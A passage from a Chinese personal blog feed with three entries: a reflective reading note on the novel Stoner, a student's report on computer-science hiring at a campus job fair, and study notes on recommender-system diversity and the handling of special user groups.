src="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/e74d9458cd02aa5acbb4cb80c82548c0_s6SPJYpTUL.jpg"></p><p>即便如此，那些文字依旧晦涩难懂，就在他快要绝望之际，一件奇妙的事情发生了。这天，斯隆教授像往常一样，用低沉而柔和的声音朗读着莎士比亚的《十四行诗》。</p><p>当他读到“目睹这些，你的爱会更加坚定，因为他转瞬要辞你溘然长往”时，斯通纳感到有什么东西在脑海里闪动，他情不自禁地跟着斯隆教授默读起来。<strong>读着读着，那些晦涩的诗句变得清晰，其中的深意也浮出水面。</strong></p><p>这个发现让他既惊且喜，只觉着心中涌起一股浓烈的渴望，渴望对这些诗句一探究竟。对此，书中这样写到：“<strong>他的自我意识开始苏醒，他从来未以这种方式感知自己。</strong>”</p><p>很快，到了下一学期选课的时间，斯通纳陷入了深深的纠结中。一边是自己对文学的渴望，一边是父母殷切的期望。</p><p><strong>顺应己心，父母失望；顺应父母，失去己心。</strong></p><p>几经挣扎，他还是无法舍弃文学，于是瞒着父母，悄然弃农学文。原本要秉承父业的他，最终顺利地拿到文学学士、硕士、博士学位，成为哥伦比亚大学的终身讲师。</p><p><img src="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/3f62712186bf56fbaf60d9c299d20c8e_AirWpKtSjG.jpg"></p><p>作家伍绮在《无声告白》里写到：“我们终此一生。就是要摆脱他人的期待，找到真正的自己”。<strong>可有太多的人，却追随他人的脚步，背负他人的期望，活成了他人想要的模样。</strong></p><p>对此，心理学博士陈海贤说：“找到自己，是你在这个世界存在的理由，是你在这个世界活着的证据。”<strong>如果把别人的地图当成自己的路，最终只会迷失方向，只有从内心认知自己，才能把握自己的人生航向。</strong></p><hr><h1 id="4-坚守，不惧人生磨难"><a href="#4-坚守，不惧人生磨难" class="headerlink" title="4 坚守，不惧人生磨难"></a>4 坚守，不惧人生磨难</h1><p>成为大学讲师的斯通纳，本以为可以给学生们安安稳稳地授课了，可就在此时，美德战争爆发了。一时间，全校师生群情激昂，争相报名参战，同事们纷纷邀他一起参军。</p><p>望着一张张狂热的面孔，斯通纳不知所措：去了，就要放弃理想，无法教学；不去，会被误认为贪生怕死，遭人唾弃。</p><p>无奈之下，只好去请教斯隆教授。斯隆教授盯着内心纠结的斯通纳，沉静地说：<strong>“你必须牢记自己是什么人，你要选择成为什么人。”</strong>这句话如醍醐灌顶，让斯通纳顿时惊醒，他毅然拒绝同事的邀约，在众人异样的目光中，坚守在自己的岗位上埋头工作。</p><p><strong>在哪里播种，哪里就会开花结果。</strong></p><p><img src="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/f1ee9a1e959f444e13c63cd8c251ba07_g3I1aka7WF.jpg"></p><p>当斯通纳认清了自己的理想，把热情倾注在文字里时，他的课大放异彩，不仅受到学生们的喜爱，就连校长也赞不绝口。</p><p><strong>可人生又怎会一帆风顺，磨难总是来得出其不意。</strong></p><p>系主任的得意门生沃尔克，也想当老师，于是选修了斯通纳的研讨课。课堂上，沃尔克仗着自己与系主任的关系，只乐于哗众取宠，无心踏实学习。论文答辩时，他张口结舌，答非所问，斯通纳毫不犹疑地否决了他。</p><p>这让系主任大为恼怒，几次让斯通纳改判，都被斯通纳一口回绝。斯通纳深知得罪系主任的后果，可他仍固执地说：“如果我让沃尔克通过了，他将来成为老师，那将是学生们的灾难。”</p><p><strong>此后的岁月里，斯通纳便生活在系主任的百般打压中；</strong></p><p>不让他继续执教研究生的课，改为教授新生；把他的课程安排得凌乱不堪，使他不能专心写作；甚至阻止了他的晋升，让他只能做个副教授。</p><p><strong>斯通纳顶着巨大的压力，默默地承受了这一切。</strong>他全身心投入到自己喜爱的天地中，锲而不舍地耕耘，不仅出版了新书，就连所教的科目也是年年第一，成为学校的传奇。</p><p><img src="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/1662b555e0fdd30b74752605f887c0ae_X0H-n5ierU.jpg"></p><p>康德说：“我早已致力于我决心坚守的东西，我将沿着自己的路走下去，什么也无法阻止我对它的追求。”</p><p><strong>斯通纳完美地演绎了这句话，他坚守在自己的一隅，明知磨难重重，依旧砥砺前行。</strong>他坚信，无论处境多么糟糕，只要坚持下去，磨难终将被喜悦取代。</p><hr><h1 id="5-和解，顿悟人生真谛"><a href="#5-和解，顿悟人生真谛" class="headerlink" title="5 和解，顿悟人生真谛"></a>5 和解，顿悟人生真谛</h1><p>列夫·托尔斯泰说：“死亡，是万物不可逃避的终结。”不管你愿不愿意，每个人都会走到生命的尽头。</p><p>斯通纳62岁时被发现患有癌症，得知此事，他异常冷静，并叮嘱医生不要告诉任何人。回到学校，他便开始疯狂工作，直到把手里的事都处理完才去做手术。</p><p><strong>术后，斯通纳不顾身体的衰弱，医生的劝阻，执意回家休养，他想静静地度过人生的最后时光。</strong></p><p>斯通纳躺在床上，总是不由自主地回忆起这一生：</p><ul><li>想在教学路上走得更远，最终只是一名副教授；</li><li>想研究文学，但只出版了一本无人问津的著作；</li><li>想拥有幸福家庭，可面对的却是冷漠的妻子，叛逆的女儿。</li></ul><p>这一生似乎除了失败还是失败，这个念头令他沮丧不已。<strong>可在沮丧之余又觉得遗漏了什么，他忍不住追问自己：“我还期待什么？”</strong></p><p><img src="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/62d9d4d664b15a8b1fc6d37591ff6cc7_K-JyAVcJaN.jpg"></p><p>这个问题一直萦绕在斯通纳的心头，当他再次从昏睡中醒来，恍惚间听到窗外学生们欢快的笑声，一种愉悦感油然而生。他想起了莎士比亚的《十四行诗》带给他的震撼，想起了沉浸在文学世界里的快乐，想起了课堂上激情澎湃地讲授……</p><p><strong>这一刻，他突然意识到，那些萦绕心头的失败，原来不值一提。</strong></p><p>自己这一生，尽管有诸多坎坷，可始终坚持做着自己热爱的事，享受着其中的乐趣、激动和满足，这岂不比世人眼里的“成功”更有价值吗？</p><p>在生命的最后时刻，斯通纳释然了，他放下了心中的执念和遗憾，明白了自己的人生看似灰暗而平凡，但却是如此的真实与独特。</p><p>这不就是人生的真谛吗？既然如此，自己还有何期望呢？</p><p>克里斯拖弗·莫利说：<strong>“只有一种真正的成功，那就是用你自己的方式度过一生。”</strong>真正的胜利者，从来不是活成别人羡慕的样子，而是拥有属于自己的人生。即便生活不够完美，也要坦然接受这个事实，毕竟不完美，才是人生常态。</p><p><strong>在平凡的生活里，勇敢地接受命运的馈赠，才能在活出自我的过程中，体会到生命的璀璨。</strong></p><hr><h1 id="6-关于婚姻"><a href="#6-关于婚姻" class="headerlink" title="6 关于婚姻"></a>6 关于婚姻</h1><p>伊迪丝，这位女性选择斯通纳作为丈夫，并非出于对他深沉的爱慕，而是出于对自由的渴望，她希望通过婚姻逃离那个令她窒息的家庭。</p><p>斯通纳，一个沉浸在学术世界中的大学教授，他对待婚姻的态度更多是出于一种责任感，而非浪漫的追求。尽管一开始他对伊迪丝是一见钟情，但是他并不了解真实的伊迪丝。</p><p>所以他们各怀目的，然后闪婚了。<strong>他们的婚姻生活，充满了沉默和距离。</strong>斯通纳在书房里埋头苦读，而伊迪丝则在钢琴前寻找自己的慰藉。他们的对话稀少，彼此之间的理解更是难以触及。</p><p><strong>这种沟通的缺失，逐渐成为了他们婚姻中的隐痛。</strong></p><p>在《斯通纳》这部作品中，沉默不仅是斯通纳与伊迪丝之间沟通的障碍，更是他们内心挣扎与逃避的写照。</p><p>斯通纳，作为一个大学老师，他的世界充满了书籍和学术的追求，而伊迪丝，她的内心世界则充满了对自由的向往和对现实束缚的不满。</p><p>伊迪丝的沉默，是她对原生家庭束缚的无声抗议，也是她对斯通纳无法给予她所渴望生活的失望。她的冷漠，是对斯通纳学术生活的不理解，也是对自己在这段关系中角色的困惑。她试图通过改变自己的外在——比如重新装修房子——来寻求一种解脱，但这种改变从未触及她的内心。</p><p>斯通纳的沉默，则是他对自己婚姻选择的内疚和无力感的体现。他深知自己无法满足伊迪丝对情感的需求，也意识到自己的学术追求与家庭生活之间的冲突。他的沉默，是一种自我保护，也是对伊迪丝情感无望后的回避。这种沉默，最终导致了他们之间的隔阂越来越深。</p><p>他们的婚姻，就像是一场没有终点的长跑，双方都在努力寻找出口，却又不知道如何打破僵局。</p><p>他们的生活，虽然在外人看来平静无波，但实际上却是暗流涌动。</p><p><img src="/2024/11/06/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%953%EF%BC%9A%E6%96%AF%E9%80%9A%E7%BA%B3/image_ekeec6h-Xt.png"></p><p>斯通纳与伊迪丝的婚姻，不仅是他们个人悲剧的体现，更是现代社会中许多人婚姻状态的缩影。<strong>在快节奏的现代生活中，许多人因为各种原因而选择结婚，却忽视了婚姻中最重要的元素——爱情和沟通。</strong></p><p>斯通纳的故事提醒我们，婚姻不应该是一种逃避现实的手段，而应该是两个人基于相互理解和爱情而做出的共同承诺。同时，斯通纳的故事也启示我们，沟通是婚姻中不可或缺的一部分。</p><p>在任何关系中，都需要双方的共同努力，去倾听、理解和尊重对方。只有这样，我们才能建立起一个坚实而温暖的家庭。</p><p>爱情不是一成不变的，而是需要我们去经营和维护。</p><p>在这个瞬息万变的时代，我们得学会倾听对方的声音，理解对方的需求，尊重对方的选择。只有这样，我们才能在婚姻中建立起真正的爱情，让爱情成为我们生活中最坚实的支柱。</p><p><strong>“一个人很难持续的爱一个人，真正的爱情是在漫长的岁月里，一次次的重新爱上彼此。”也许这就是爱情本来的样子。</strong></p><hr><h1 id="7-个人感受"><a href="#7-个人感受" class="headerlink" title="7 个人感受"></a>7 个人感受</h1><p>思想家蒙田说：“世界上最伟大的事，是一个人懂得如何做自己的主人。”就像斯通纳一样，在平凡的生活中，面对凄风苦雨，从不曾改变对自我的追求。</p><p>我们很多人都易被外在的事物所迷惑，忽略了自己的本心，一味地追求别人眼里的荣耀。直到回首过往，才悲哀地发现，自己活成了别人的影子。</p><p><strong>在这纷繁杂乱的尘世中，唯有看清本心，方能不被外物所扰，于迷茫中见希望，在希望中成就独一无二的人生。</strong></p><p>希望我这一生都能如这本书的腰封所言：即便不能拥有完美的生活，所幸追求过完整的自我。</p>]]></content>
      
      
      <categories>
          
          <category> 读书记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机岗位双选会调研感悟</title>
      <link href="/2024/10/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B2%97%E4%BD%8D%E5%8F%8C%E9%80%89%E4%BC%9A%E8%B0%83%E7%A0%94%E6%84%9F%E6%82%9F/"/>
      <url>/2024/10/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B2%97%E4%BD%8D%E5%8F%8C%E9%80%89%E4%BC%9A%E8%B0%83%E7%A0%94%E6%84%9F%E6%82%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>东秦在 2024年10月25日 举办了秋季双选会，秋季双选会是一个为大学生提供就业机会的招聘活动，为应届生与用人单位进行面对面交流，了解职业发展方向和行业动态，并与企业达成就业意向。同时老师给我一个任务：对一部分企业针对我们学院（计算机与通信工程学院）的相关专业的招聘情况进行一下调研。</p><p><img src="/2024/10/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B2%97%E4%BD%8D%E5%8F%8C%E9%80%89%E4%BC%9A%E8%B0%83%E7%A0%94%E6%84%9F%E6%82%9F/image_5tG5TWCW-B.png"></p><p>刚接到这个任务的时候我感觉这是一个很好的机会，想趁着这个机会了解一下现在计算机专业应届生的求职情况。从大概九点多开始，一直调研到下午一点，这个时间段也是双选会最火爆的一个时间段，人特别多，摩肩接踵，很多企业的摊位前排了很长的队伍。</p><p>当时在想，如果我也直接工作的话肯定也成为这十万大军中的一员，能明显感受到求职者对于找工作的热情。三年之后我也要找工作，我就在想，为什么不从现在就开始为找工作做准备呢？为什么大二的时候不确定自己以后是工作还是考研？如果工作的话为什么不早点准备呢？人这一辈子不论上多少年的学，总是要找一份工作的，我们上学的目的不就是为了找工作吗？</p><p>经过对大概20多家企业的调研和这个过程中自己的所见所闻，感受颇深，将这些感想写下，希望对自己的人生规划有帮助。</p><hr><h1 id="2-企业岗位需求"><a href="#2-企业岗位需求" class="headerlink" title="2 企业岗位需求"></a>2 企业岗位需求</h1><p>在我调研的企业中对计算机相关岗位的需求，大概有以下几种：</p><ol><li>软件开发工程师</li><li>Web 前端开发</li><li>嵌入式开发</li><li>数据开发</li><li>算法工程师</li><li>测试工程师</li><li>运维工程师</li></ol><p>总结为三类：开发、算法和运维。可以看到，目前就业市场对于计算机岗位的需求还是蛮多的，其中有一些岗位需要硕士以上学历才可以投递，但是大部分岗位本科生就可以投递。所以学生肯定不用担心找不到工作机会，机会很多，关键是能不能把握住机会。</p><hr><h1 id="3-企业人才需求"><a href="#3-企业人才需求" class="headerlink" title="3 企业人才需求"></a>3 企业人才需求</h1><p>企业在招聘时重点关注应聘者的什么能力？这个问题虽然在上面的调研问卷中没有出现，但我觉得也是求职者应该关注的一个内容。这就像拧螺丝一样，不同的螺丝钉需要不同的工具来拧，要对症下药，企业也想招聘他们需要的人才。所以我们也应该知道企业看重求职者的什么能力，然后我们要加强这方面的能力。</p><p>通过对多个企业进行调研，总结如下：</p><ol><li><strong>沟通协调和团队协作能力</strong>：有一个HR首先说了这个是我没有想到的，他说计算机相关的求职者通常参加的活动较少，人际交往相对较弱，但是有效的沟通在公司业务中至关重要，有时沟通不对会带来很多不必要的问题，所以他对于这方面的能力有所要求。</li><li><strong>和岗位相关的实习实践（项目）经历</strong>：最好是和岗位匹配的实践经历，这样的话入职之后的业务往往和该项目有很多相同的地方，所以类似的项目经历可以使求职者更快熟悉业务流程。</li><li><strong>专业能力</strong>：例如Java开发，一定要懂得Java相关的基础知识，这部分也就是通常所说的面经，在网上IT相关的每个岗位几乎都有面经，这部分要熟练掌握。</li><li><strong>专业课</strong>：有些企业提到计算机相关的专业课（408）要掌握，计算机常见的基础知识要掌握，面试的时候可能会问到这些内容。</li><li><strong>在校成绩</strong>：大部分企业将学生的在校成绩列为参考项，意思是这一部分不是最主要的，但是也会看这一个指标，有些企业提到看重学生的学习能力，就是从学业成绩来进行参考。</li><li><strong>价值观是否匹配</strong>：这一部分可能大部分求职者不太关注，比如，有的企业的文化就是使劲干，因此压力肯定大，工业肯定会高，而且企业内部的一些晋升淘汰制度是否能让你接受，这些都是你的价值观和企业的是否匹配的问题。</li></ol><p>总之，如果你能做到方向匹配、经历匹配、良好的团队合作能力、过硬的知识储备，肯定可以找到一份心仪的工作。</p><hr><h1 id="4-目前计算机学生求职的误区"><a href="#4-目前计算机学生求职的误区" class="headerlink" title="4 目前计算机学生求职的误区"></a>4 目前计算机学生求职的误区</h1><p>都知道，计算机之前是一个热门专业，高薪仿佛成了IT行业的一个标签，但是随着互联网的发展，计算机的第一波红利已经过去了。但是网络上还是有很多IT高薪相关的内容，由于幸存者偏差，导致很多计算机求职者也认为自己理应拿到较多的薪水。但是，通过调研，很多企业给出的计算机相关的岗位并没有网络上的那么高，因为网络上大部分都是BAT这一类的企业，但是能进这类企业的人肯定占小部分，所以这让很多求职者在实际找工作的过程中产生偏差。</p><p>和一位HR了解到，双选会时他和很多学生聊过实习的事情，大概工资是150一天，包住，工作内容轻松。很多学生反映薪资太低。HR告诉我其实这个实习待遇算是比较好了，很多公司虽然日薪高一些，但是不管住宿，在大城市租房子的成本也是很高的，所以他感觉很多学生的期望太高。</p><p>我们每个人都有幸存偏差，认为自己是可以拿高薪的那一个。但是单从掌握技术的角度来说，很多同学本身并没有过硬的技术，但还是想拿一个很好的薪资。所以我认为首先应当认识到这种趋势，给自己精准定位。在原来，如果你要找前端开发只需要掌握前端相关的技术就可以，但是现在肯定要掌握更多的技术。如果你可以把一项技术真正的搞明白，就业市场对于高质量的人才的需求还是非常大的。</p><p>另外，并不是薪资高的工作就是好工作，好工作一定要是适合自己的，例如，有的人就喜欢沟通、交流，那么他可以从事产品经理这样的工作，有人就喜欢做研究，那么他可以进一些研发岗。所以好工作就是适合自己的，符合自己未来发展预期的，而不是盲目的追求高薪。</p><hr><h1 id="5-应该做些什么？"><a href="#5-应该做些什么？" class="headerlink" title="5 应该做些什么？"></a>5 应该做些什么？</h1><p>现在问题来了，知道了企业的需求之后，我们可以做些什么呢？怎么做呢？</p><p>我觉得首先要找准自己的就业方向，是想做开发、算法还是运维等，其中具体的还要细分各种职务，比如前端开发、后端开发和嵌入式开发等等。</p><p>找准了方向之后，不建议随便更换方向，因为如果两个岗位需要的工作技能是不同的话，这必然会浪费大量的宝贵时间。计算机的岗位一定是去解决实际问题的，我们要思考要解决的问题是什么，为什么要解决这个问题，怎么解决这个问题。公司需要你做的业务必然也和这些相关。当谈论到怎么解决时，就需要具体的技术栈。这时候需要自学相关的技术，同时多做相关的项目、竞赛。一定要是相关的，重要的匹配度，如果企业需要C++后端开发，但是你熟练掌握C++开发游戏，这样就不是很好。因为后端开发的架构和游戏开发肯定截然不同。同时也可以去企业实习，接触一些实际的项目，了解工业界常用的解决方案。</p><p>总结：确定方向 → 专业技能的储备 → 相关的实践经历（项目、竞赛和论文） → 良好的团队合作能力</p><p>对于现在准备就业的同学来说，秋招即将结束，但是还有明年的春招，所以现在可以打磨一下自己的专业技能，增加一些实践经历，利用好这段时间，同样有希望能在明天的春招中找到心仪的工作。</p><p>对于现在准备考研和考公的同学来说，到了冲刺的时期了，所以大部分人的重心应该在考试上。考完试之后，如果要找工作的话可以好好利用寒假，我了解之前的学长就有考研之后又想去工作了，然后寒假一直在准备春招，最后春招上岸。</p><p>对于现在已经推免的同学来说，如果毕业之后想参加工作的，2年硕士的话会参加2026年的秋招和2027年的春招，3年硕士的话会参加2027的秋招和2028年的春招。所以可以现在确定以后的就业方向，考公、选调和找工作等。提前准备，相信大部分人读研的目的还是为了更好的就业。</p>]]></content>
      
      
      <categories>
          
          <category> 思考总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记12：涨指标的方法2</title>
      <link href="/2024/10/28/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B012%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%952/"/>
      <url>/2024/10/28/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B012%EF%BC%9A%E6%B6%A8%E6%8C%87%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%952/</url>
      
        <content type="html"><![CDATA[<h1 id="1-提升多样性"><a href="#1-提升多样性" class="headerlink" title="1 提升多样性"></a>1 提升多样性</h1><p>可以通过提升多样性来提高指标，包括排序多样、召回多样性和探索流量。</p><h2 id="1-1-排序多样性"><a href="#1-1-排序多样性" class="headerlink" title="1.1 排序多样性"></a>1.1 排序多样性</h2><h3 id="1-1-1-精排多样性"><a href="#1-1-1-精排多样性" class="headerlink" title="1.1.1 精排多样性"></a>1.1.1 精排多样性</h3><p>精排阶段，结合兴趣分数和多样性分数对物品 $i$ 排序。</p><ul><li>$s_i$：兴趣分数，即融合点击率等多个预估目标</li><li>$d_i$：多样性分数，即物品 $i$ 与已经选中的物品的差异</li></ul><p>根据加和 $s_i+d_i$ 对物品做排序。</p><p>常用 MMR、DPP 等方法计算多样性分数，精排使用滑动窗口，粗排不使用滑动窗口。因为精排决定最终的曝光，曝光页面上邻近的物品相似度应该小，所以计算精排多样性要使用滑动窗口。粗排要考虑整体的多样性，而非一个滑动窗口中的多样性。</p><p>除了多样性分数，精排还使用打散策略增加多样性。</p><ul><li><strong>类目</strong>：当前选中物品 $i$，之后 5 个位置不允许跟 $i$ 的二级类目相同</li><li><strong>多模态</strong>：事先计算物品多模态内容向量表征，将全库物品聚为 1000 类；在精排阶段，如果当前选中物品 $i$，之后 10 个位置不允许跟 $i$ 同属一个聚类，因为一个聚类中的图片和文字相似，应该被打散</li></ul><h3 id="1-1-2-粗排多样性"><a href="#1-1-2-粗排多样性" class="headerlink" title="1.1.2 粗排多样性"></a>1.1.2 粗排多样性</h3><p>粗排给 5000 个物品打分，选出 500 个物品送入精排。提升粗排和精排多样性都可以提升推荐系统核心指标。</p><p>根据 $s_i$ 对 5000 个物品排序，分数最高的 200 个物品送入精排，这里暂时不考虑多样性分数，优先考虑兴趣分数，保证用户感兴趣的物品能够优先进入精排。对于剩余的 4800 个物品，对每个物品 $i$ 计算兴趣分数 $s_i$ 和多样性分数 $d_i$。根据 $s_i+d_i$ 对剩余 4800 个物品排序，分数最高的 300 个物品送入精排，这 300 个物品既是用户感兴趣的，也和之前挑选出的 200 个物品有较大差异。</p><h2 id="1-2-召回多样性"><a href="#1-2-召回多样性" class="headerlink" title="1.2 召回多样性"></a>1.2 召回多样性</h2><h3 id="1-2-1-双塔模型：添加噪声"><a href="#1-2-1-双塔模型：添加噪声" class="headerlink" title="1.2.1 双塔模型：添加噪声"></a>1.2.1 双塔模型：添加噪声</h3><p>用户塔将用户特征作为输入，输出用户的向量表征；然后在向量数据库中做 ANN 检索，召回向量相似度高的物品。</p><p>线上做召回时（在计算出用户向量之后，在做 ANN 检索之前），往用户向量中添加随机噪声。添加的噪声强弱取决于用户的兴趣，用户的兴趣越窄（比如用户最近交互的 $n$ 个物品只覆盖少数几个类目），则添加的噪声越强。</p><p>添加噪声使得召回的物品更多样，添加多样性，可以提升推荐系统核心指标。</p><h3 id="1-2-2-双塔模型：抽样用户行为序列"><a href="#1-2-2-双塔模型：抽样用户行为序列" class="headerlink" title="1.2.2 双塔模型：抽样用户行为序列"></a>1.2.2 双塔模型：抽样用户行为序列</h3><p>用户最近交互的 $n$ 个物品（用户行为序列）是用户塔的输入，保留最近的 $r$ 个物品（$r \ll n$），对用户随机序列做随机抽样，可以提高召回的多样性，因此提升推荐系统的核心指标。</p><p>从剩余的 $n-r$ 个物品中随机抽样 $t$ 个物品（$t \ll n$），可以是均匀抽样，也可以用非均匀抽样让类目平衡。将得到的 $r+t$ 个物品作为用户行为序列，而不是用全部 $n$ 个物品。</p><p>每次做召回的时候，都会对用户行为序列做随机抽样，这样会让双塔模型召回的结果有随机性，多样性会提升。抽样用户行为序列为什么能涨指标？</p><ol><li>注入随机性，召回结果更多样化</li><li>$n$ 可以非常大，可以利用到用户很久之前的兴趣</li></ol><h3 id="1-2-3-U2I2I：抽样用户行为序列"><a href="#1-2-3-U2I2I：抽样用户行为序列" class="headerlink" title="1.2.3 U2I2I：抽样用户行为序列"></a>1.2.3 U2I2I：抽样用户行为序列</h3><p>U2I2I（user ⟶ item ⟶ item）中的第一个 item 是指用户最近交互的 $n$ 个物品之一，在 U2I2I 中叫作种子物品。$n$ 个物品覆盖的类目数较少，且类目不平衡。</p><p>假设系统共有 200 个类目，某用户的 $n$ 个物品只覆盖 15 个类目，这说明用户的兴趣不是很宽泛。另一方面，这 $n$ 个物品的类目非常不平衡，足球类目的物品有 $0.4n$ 个，电视剧类目的物品有 $0.2n$ 个，其余类目的物品数均少于 $0.05n$ 个。如果直接用这 $n$ 个物品作为种子，那么召回的物品大部分都集中于足球和电视剧，多样性很差。</p><p>为了提升多样性，可以做非均匀随机抽样，从 $n$ 个物品中选出 $t$ 个，让类目平衡（想法和效果与双塔中的用户行为序列抽样相似）。用抽样得到的 $t$ 个物品（代替原本的 $n$ 个物品）作为 U2I2I 的种子物品。</p><p>一方面，类目更平衡，多样性更好。另一方面，现在可以把 $n$ 设置的可以更大，覆盖的类目更多。</p><h2 id="1-3-探索流量"><a href="#1-3-探索流量" class="headerlink" title="1.3 探索流量"></a>1.3 探索流量</h2><p>给每个用户曝光的物品中有 2%是非个性化的，用作兴趣探索。维护⼀个精选内容池，其中物品均为交互率指标高的优质物品（内容池可以分人群，比如30~40岁男性内容池）。既然没有了个性化，那么就要提升物品质量来吸引用户，用高质量来弥补缺少个性化造成的损失。</p><p>从精选内容池中随机抽样几个物品，跳过排序，把物品直接插入最终排序结果。兴趣探索在短期内一定会对核心指标产生负向影响，但长期会产生正向影响，会发掘用户更多的兴趣点，吸引用户留存。</p><hr><h1 id="2-特殊用户人群"><a href="#2-特殊用户人群" class="headerlink" title="2 特殊用户人群"></a>2 特殊用户人群</h1><p>推荐系统为什么要特殊对待特殊人群，有几方面原因：</p><ol><li>新⽤户、低活⽤户的⾏为很少，个性化推荐不准确。</li><li>新⽤户、低活⽤户容易流失，要想办法促使他们留存。</li><li>特殊⽤户的⾏为（⽐如点击率、交互率）不同于主流⽤户，基于全体⽤户⾏为训练出的模型在特殊⽤户⼈群上有偏差，效果不好，所以要使用对特殊人群使用特殊模型消除偏差。</li></ol><p>具体有以下三种涨指标的方法：</p><ol><li>构造特殊内容池，⽤于特殊⽤户⼈群的召回。</li><li>使⽤特殊排序策略，保护特殊⽤户。</li><li>使⽤特殊的排序模型，消除模型预估的偏差。</li></ol><h2 id="2-1-构造特殊的内容池"><a href="#2-1-构造特殊的内容池" class="headerlink" title="2.1 构造特殊的内容池"></a>2.1 构造特殊的内容池</h2><p>推荐系统为什么需要给特殊用户构造特殊的内容池？</p><ul><li>新⽤户、低活⽤户的⾏为很少，个性化召回不准确。（既然个性化不好，那么就保证内容质量好。)</li><li>针对特定⼈群的特点构造特殊内容池，提升⽤户满意度。（例如，对于喜欢留评论的中年⼥性，构造促评论内容池，满⾜这些⽤户的互动需求。）</li></ul><p>如何构造特殊内容池？</p><ol><li><p>方法 1：根据物品获得的交互次数、交互率选择优质物品</p><p>首先要圈定⼈群：只考虑特定⼈群，例如18~25岁⼀⼆线城市男性。然后⽤该⼈群对物品的交互次数、交互率给物品打分，选出分数最⾼的物品进⼊内容池。内容池有弱个性化的效果。</p><p>内容池定期更新，加⼊新物品，排除交互率低和失去时效性的⽼物品。这样构造出的内容池只对该⼈群⽣效。</p></li><li><p>方法 2：做因果推断，判断物品对⼈群留存率的贡献，根据贡献值选物品。这方面的技术不算很成熟。</p></li></ol><h2 id="2-2-特殊内容池的召回"><a href="#2-2-特殊内容池的召回" class="headerlink" title="2.2 特殊内容池的召回"></a>2.2 特殊内容池的召回</h2><p>通常使⽤双塔模型从特殊内容池中做召回。双塔模型是个性化的。对于新⽤户，双塔模型的个性化做不准，可以靠⾼质量内容、弱个性化做弥补。</p><p>推荐系统有很多内容池，每多增加一个内容池，会增加多少额外的训练代价？</p><ul><li>对于正常用户，不论有多少内容池，只训练一个双塔模型</li><li>对于新用户，由于历史交互记录很少，需要单独训练模型</li></ul><p>每多增加一个内容池，都需要多增加一份额外的推理代价：</p><ul><li>内容池定期更新，然后要更新 ANN 索引。</li><li>线上做召回时，需要做 ANN 检索。</li><li>增加的计算量和内容池大小相关，特殊内容池都很小（比全量内容池小10~100倍），所以需要的额外算⼒不⼤。</li></ul><h2 id="2-3-特殊的排序策略"><a href="#2-3-特殊的排序策略" class="headerlink" title="2.3 特殊的排序策略"></a>2.3 特殊的排序策略</h2><h3 id="2-3-1-排除低质量物品"><a href="#2-3-1-排除低质量物品" class="headerlink" title="2.3.1 排除低质量物品"></a>2.3.1 排除低质量物品</h3><p>对于新⽤户、低活⽤户这样的特殊⼈群，业务上只关注留存，不在乎消费（总曝光量、广告收⼊、电商收入）。</p><p>对于新⽤户、低活⽤户，少出广告、甚⾄不出广告。新发布的物品不在新⽤户、低活⽤户上做探索。物品新发布时，推荐做得不准，会损害⽤户体验。既然要做探索，只在活跃的⽼⽤户上做探索，对新物品提权（boost）。不在新⽤户、低活⽤户上做探索，避免伤害⽤户体验。</p><h3 id="2-3-2-差异化的融分公式"><a href="#2-3-2-差异化的融分公式" class="headerlink" title="2.3.2 差异化的融分公式"></a>2.3.2 差异化的融分公式</h3><p>新用户、低活用户的点击、交互⾏为不同于正常⽤户。低活⽤户的⼈均点击量很⼩；没有点击就不会有进⼀步的交互，不会发生点赞、收藏、评论和转发。低活⽤户的融分公式中，提⾼预估点击率的权重（相较于普通⽤户）。</p><p>还可以保留几个曝光坑位给预估点击率最⾼的几个物品。例如，精排从 500 个物品中选 50 个作为推荐结果，其中 3 个坑位给预估点击率最⾼的物品，剩余 47 个坑位由融分公式决定，这 3 个坑位的作用是吸引用户点击，甚⾄可以把点击率最⾼的物品排在第⼀，确保⽤户⼀定能看到。</p><h2 id="2-4-特殊的排序模型"><a href="#2-4-特殊的排序模型" class="headerlink" title="2.4 特殊的排序模型"></a>2.4 特殊的排序模型</h2><h3 id="2-4-1-差异化的排序模型"><a href="#2-4-1-差异化的排序模型" class="headerlink" title="2.4.1 差异化的排序模型"></a>2.4.1 差异化的排序模型</h3><p>特殊⽤户⼈群的⾏为不同于普通⽤户，新⽤户、低活⽤户的点击率、交互率偏⾼或偏低。</p><p>排序模型被主流⽤户主导，对特殊⽤户做不准预估。⽤全体⽤户数据训练出的模型，给新⽤户做的预估有严重偏差。如果⼀个 APP 的⽤ 